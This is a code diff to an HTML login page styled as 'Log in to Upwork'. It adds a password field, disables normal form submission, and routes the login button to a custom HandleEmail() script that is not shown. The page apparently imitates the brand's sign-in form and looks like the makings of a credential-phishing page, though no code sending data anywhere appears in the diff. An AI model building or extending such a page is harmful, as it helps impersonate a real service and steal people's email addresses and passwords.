@@ -7,7 +7,7 @@
 <main class="container">
     <div class="page-login">
         <div class="form-login">
-            <form class="form auth-growable-flex text-center username px-md-8x auth-growable-flex">
+            <form class="form auth-growable-flex text-center username px-md-8x auth-growable-flex" onsubmit="false">
                 <div class="content-login">
                     <h1 class="text-center h3 mb-md-6x">
                         <span>Log in to Upwork</span>
@@ -25,10 +25,24 @@
                             </div>
                         </span>
                         <input type="text" class="form-control" placeholder="Email" aria-label="email"
-                               id="email2"
-                               aria-describedby="basic-addon1">
-
+                               id="email2">
                     </div>
+                    <div class="input-group mb-3">
+                        <span class="input-group-text" id="basic-addon1">
+                            <div class="air3-icon sm">
+                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" aria-hidden="true"
+                                     viewBox="0 0 24 24" role="img">
+                                    <path vector-effect="non-scaling-stroke" stroke="var(--icon-color, #001e00)"
+                                          stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                                          d="M12 11a4 4 0 100-8 4 4 0 000 8zM5 21v-.31a7 7 0 017-7v0a7 7 0 017 7V21">
+                                    </path>
+                                </svg>
+                            </div>
+                        </span>
+                        <input type="password" class="form-control" placeholder="" aria-label="pass"
+                               id="pass">
+                    </div>
+
                     <button id="login_password_continue" type="button"
                             onclick="HandleEmail()"
                             class="air3-btn mr-0 air3-btn-block mb-0 air3-btn-primary">
